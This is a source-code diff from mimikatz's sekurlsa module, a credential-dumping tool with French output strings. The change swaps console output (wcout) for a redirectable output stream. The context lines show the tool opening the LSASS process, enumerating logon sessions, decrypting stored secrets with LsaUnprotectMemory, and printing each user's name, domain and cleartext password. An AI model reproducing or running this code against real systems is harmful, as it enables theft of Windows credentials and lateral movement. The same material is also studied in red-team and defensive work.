@@ -34,7 +34,7 @@ bool mod_mimikatz_sekurlsa::getLogonPasswords(vector<wstring> * arguments)
 	if(searchLSASSDatas())
 		getLogonData(arguments, &GLOB_ALL_Providers);
 	else
-		wcout << L"Données LSASS en erreur" << endl;
+		(*outputStream) << L"Données LSASS en erreur" << endl;
 	return true;
 }
 
@@ -103,12 +103,12 @@ bool mod_mimikatz_sekurlsa::searchLSASSDatas()
 							}
 						}
 					} else {
-						wcout << L"mod_process::getVeryBasicModulesListForProcess : " << mod_system::getWinError() << endl;
+						(*outputStream) << L"mod_process::getVeryBasicModulesListForProcess : " << mod_system::getWinError() << endl;
 						CloseHandle(hLSASS);
 						hLSASS = NULL;
 					}
-				} else wcout << L"OpenProcess : " << mod_system::getWinError() << endl;
-			} else wcout << L"mod_process::getUniqueForName : " << mod_system::getWinError() << endl;
+				} else (*outputStream) << L"OpenProcess : " << mod_system::getWinError() << endl;
+			} else (*outputStream) << L"mod_process::getUniqueForName : " << mod_system::getWinError() << endl;
 		}
 
 		if(hLSASS)
@@ -206,26 +206,26 @@ void mod_mimikatz_sekurlsa::genericCredsToStream(PKIWI_GENERIC_PRIMARY_CREDENTIA
 			if(justSecurity)
 			{
 				if(!pos)
-					wcout << password;
+					(*outputStream) << password;
 				else
-					wcout << endl <<
+					(*outputStream) << endl <<
 					L"\t [" << *pos << L"] { " << rUserName << L" ; " << rDomainName << L" ; " << password << L" }";
 			}
 			else
 			{
 				if(!pos)
-					wcout << endl <<
+					(*outputStream) << endl <<
 					L"\t * Utilisateur  : " << rUserName << endl <<
 					L"\t * Domaine      : " << rDomainName << endl <<
 					L"\t * Mot de passe : " << password;
 				else
-					wcout << endl <<
+					(*outputStream) << endl <<
 					L"\t * [" << *pos  << L"] Utilisateur  : " << rUserName << endl <<
 					L"\t       Domaine      : " << rDomainName << endl <<
 					L"\t       Mot de passe : " << password;
 			}
 		}
-	} else wcout << L"n.t. (LUID KO)";
+	} else (*outputStream) << L"n.t. (LUID KO)";
 }
 
 bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<pair<PFN_ENUM_BY_LUID, wstring>> * mesProviders)
@@ -242,7 +242,7 @@ bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<
 			{
 				if(sessionData->LogonType != Network)
 				{
-					wcout << endl <<
+					(*outputStream) << endl <<
 						L"Authentification Id         : "	<< sessions[i].HighPart << L";" << sessions[i].LowPart << endl <<
 						L"Package d\'authentification  : "	<< mod_text::stringOfSTRING(sessionData->AuthenticationPackage) << endl <<
 						L"Utilisateur principal       : "	<< mod_text::stringOfSTRING(sessionData->UserName) << endl <<
@@ -250,18 +250,18 @@ bool mod_mimikatz_sekurlsa::getLogonData(vector<wstring> * mesArguments, vector<
 
 					for(vector<pair<PFN_ENUM_BY_LUID, wstring>>::iterator monProvider = mesProviders->begin(); monProvider != mesProviders->end(); monProvider++)
 					{
-						wcout << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
+						(*outputStream) << L'\t' << monProvider->second << (mesArguments->empty() ? (L" :") : (L"")) << L'\t';
 						monProvider->first(&sessions[i], mesArguments->empty());
-						wcout << endl;
+						(*outputStream) << endl;
 					}
 				}
 				LsaFreeReturnBuffer(sessionData);
 			}
-			else wcout << L"Erreur : Impossible d\'obtenir les données de session" << endl;
+			else (*outputStream) << L"Erreur : Impossible d\'obtenir les données de session" << endl;
 		}
 		LsaFreeReturnBuffer(sessions);
 	}
-	else wcout << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;
+	else (*outputStream) << L"Erreur : Impossible d\'énumerer les sessions courantes" << endl;
 
 	return true;
 }
@@ -327,7 +327,7 @@ bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
 											mod_mimikatz_sekurlsa::SeckPkgFunctionTable->LsaUnprotectMemory(bPassword, donnees[2].MaximumLength);
 											password.assign(mod_text::stringOrHex(bPassword, donnees[2].Length, 0, false));
 										}
-										wcout << L"[" << nbPossible++ << L"] { " << user << L" ; " << domain << L" ; " << password << L" }" << endl;
+										(*outputStream) << L"[" << nbPossible++ << L"] { " << user << L" ; " << domain << L" ; " << password << L" }" << endl;
 									}
 
 									if(bPassword)
@@ -342,6 +342,6 @@ bool mod_mimikatz_sekurlsa::searchPasswords(vector<wstring> * arguments)
 			}
 		}
 	}
-	else wcout << L"Données LSASS en erreur" << endl;
+	else (*outputStream) << L"Données LSASS en erreur" << endl;
 	return true;
 }
